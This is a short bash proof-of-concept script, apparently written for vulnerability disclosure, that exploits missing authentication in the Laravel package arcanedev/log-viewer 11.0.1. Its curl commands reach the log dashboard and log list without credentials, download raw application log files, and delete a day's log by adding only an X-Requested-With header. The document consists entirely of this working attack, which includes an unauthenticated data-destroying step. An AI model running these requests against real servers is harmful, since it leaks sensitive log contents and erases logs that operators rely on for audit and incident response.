#!/usr/bin/env bash
# LGV-01 PoC - arcanedev/log-viewer 11.0.1 (Laravel): dashboard, raw-log download and
# log deletion are unauthenticated by default (route middleware = null when
# ARCANEDEV_LOGVIEWER_MIDDLEWARE is unset; delete only gated by the ajax header).
#
# Usage: ./poc-unauth.sh [TARGET] [DATE]
#        e.g. ./poc-unauth.sh http://127.0.0.1:8099 2026-09-30
#
# Every request below is deliberately sent with NO session, NO cookie and NO token.
set -u
TARGET="${1:-http://127.0.0.1:8099}"
DATE="${2:-$(date +%F)}"

echo "=== [T1] GET /log-viewer (dashboard) - unauthenticated"
curl -s -o /dev/null -w '  -> HTTP %{http_code} (%{size_download} bytes)\n' "$TARGET/log-viewer/"

echo "=== [T2] GET /log-viewer/logs (log list) - unauthenticated"
curl -s -o /dev/null -w '  -> HTTP %{http_code} (%{size_download} bytes)\n' "$TARGET/log-viewer/logs"

echo "=== [T3] GET /log-viewer/logs/$DATE/download (raw log file) - unauthenticated"
curl -s -D headers.txt -o "laravel-$DATE.log" "$TARGET/log-viewer/logs/$DATE/download"
grep -i '^content-disposition' headers.txt || echo '  (no content-disposition header)'
echo "  -> downloaded $(wc -c < "laravel-$DATE.log") bytes to laravel-$DATE.log"

echo "=== [T4a] DELETE /log-viewer/logs/delete WITHOUT ajax header (control -> expect 405)"
curl -s -o /dev/null -w '  -> HTTP %{http_code} (expected 405: the only gate is the header)\n' \
     -X DELETE "$TARGET/log-viewer/logs/delete" -d "date=$DATE"

echo "=== [T4b] DELETE /log-viewer/logs/delete WITH X-Requested-With: XMLHttpRequest (no CSRF, no auth)"
curl -s -X DELETE -H 'X-Requested-With: XMLHttpRequest' "$TARGET/log-viewer/logs/delete" -d "date=$DATE"
echo

echo "=== verify on the server side:"
echo "  ls storage/logs/laravel-$DATE.log   # -> No such file or directory (deleted)"

rm -f headers.txt
